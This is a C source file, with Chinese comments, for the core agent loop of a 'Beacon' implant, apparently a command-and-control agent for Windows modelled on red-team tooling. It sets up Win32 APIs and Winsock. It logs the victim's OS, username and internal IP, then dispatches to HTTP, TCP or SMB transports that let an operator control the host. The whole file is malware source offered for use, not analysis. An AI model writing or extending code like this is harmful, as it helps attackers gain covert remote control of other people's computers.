#include "beacon_agent_internal.h"

#pragma comment(lib, "ws2_32.lib")

#if defined(BEACON_EXTERNAL_TCP_BUILD) && \
    (defined(BEACON_INTERNAL_TCP_BUILD) || defined(BEACON_INTERNAL_SMB_BUILD))
#error BEACON_EXTERNAL_TCP_BUILD cannot be combined with internal transport builds.
#endif

/*
 * Agent 层是 Beacon 的主循环调度入口：
 * 初始化上下文，根据 profile/build 选择 external/internal 运行模式。
 */

/* 初始化 Agent 结构体、Win32 API 解析及 Winsock */
INT AgentInit(Agent* agent)
{
    if (!agent) {
        return 0;
    }

    SecureZeroMemory(agent, sizeof(*agent));

    ContextInit(&agent->ctx);

    /* ContextInit 会清零 BeaconContext，API 解析必须在它之后执行。 */
    if (!Win32ApiInit(&agent->ctx.api)) {
        ContextFree(&agent->ctx);
        return 0;
    }

    if (WSAStartup(MAKEWORD(2, 2), &agent->wsa) != 0) {
        ContextFree(&agent->ctx);
        return 0;
    }
    agent->wsa_started = 1;

    agent->initialized = 1;
    agent->stop = 0;
    return 1;
}

/* 释放 Agent 资源并清理 Winsock */
VOID AgentFree(Agent* agent)
{
    if (!agent) {
        return;
    }

    if (agent->initialized) {
        ContextFree(&agent->ctx);
        agent->initialized = 0;
    }

    if (agent->wsa_started) {
        WSACleanup();
        agent->wsa_started = 0;
    }
}

/* 信标主循环：按构建/profile 分发到具体 transport runner */
INT AgentRun(Agent* agent)
{
    BeaconContext* ctx;

    if (!agent || !agent->initialized) {
        return -1;
    }

    ctx = &agent->ctx;

    DebugPrintf("[*] Beacon modular C starting...\n");
    DebugPrintf("[*] Metadata: OS=%s Arch=%s User=%s IP=%s\n",
                ctx->meta.os, ctx->meta.arch, ctx->meta.username, ctx->meta.internal_ip);
    DebugPrintf("[*] BeaconID: %lu\n", (unsigned long)ctx->beacon_id);

#if defined(BEACON_EXTERNAL_TCP_BUILD)
    return AgentRunExternalTcp(agent);
#else
    if (_stricmp(ctx->profile.listener_type, "internal") == 0 &&
        _stricmp(ctx->profile.protocol, "tcp") == 0) {
        return AgentRunInternalTcp(agent);
    }

    if (_stricmp(ctx->profile.listener_type, "internal") == 0 &&
        _stricmp(ctx->profile.protocol, "smb") == 0) {
        return AgentRunInternalSmb(agent);
    }

    return AgentRunExternalHttp(agent);
#endif
}

/* 请求 Agent 停止 */
VOID AgentStop(Agent* agent)
{
    if (agent) {
        InterlockedExchange(&agent->stop, 1);
    }
}
